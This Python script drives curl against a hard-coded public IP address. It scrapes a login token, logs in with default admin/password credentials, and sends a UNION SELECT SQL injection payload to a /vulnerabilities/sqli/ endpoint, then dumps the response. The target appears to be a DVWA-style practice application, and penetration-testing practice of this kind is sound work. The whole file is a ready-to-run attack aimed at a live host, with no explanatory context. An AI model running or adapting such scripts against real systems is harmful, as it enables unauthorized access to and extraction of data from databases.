
import subprocess
import re

# Step 1: Get login page and extract token
cmd = [
    'curl',
    '-s',
    '-c', '/tmp/cookies.txt',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", result.stdout)
token = token_match.group(1) if token_match else None
print(f"[*] Token: {token}")

# Step 2: Login
cmd = [
    'curl',
    '-s',
    '-b', '/tmp/cookies.txt',
    '-c', '/tmp/cookies.txt',
    '-d', f'username=admin&password=password&user_token={token}&Login=Login',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
print("[*] Logged in")

# Step 3: Test with 3 columns
test_id = "999 UNION SELECT 1,2,3-- -"

cmd = [
    'curl',
    '-s',
    '-b', '/tmp/cookies.txt',
    '-d', f'id={test_id}&Submit=Submit',
    'http://31.97.117.123/vulnerabilities/sqli/'
]

result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

# Save full response
with open('/tmp/sqli_full_test.html', 'w') as f:
    f.write(result.stdout)

print("[*] Full response saved to /tmp/sqli_full_test.html")
print(f"[*] Response length: {len(result.stdout)}")

# Look for pre section - print everything
if '<pre>' in result.stdout:
    start = result.stdout.find('<pre>')
    end = result.stdout.find('</pre>', start) + 6
    section = result.stdout[start:end]
    print("[+] Pre section found:")
    print(section)
else:
    print("[-] No pre section found")

# Print last 500 chars
print("\nLast 500 chars of response:")
print(result.stdout[-500:])

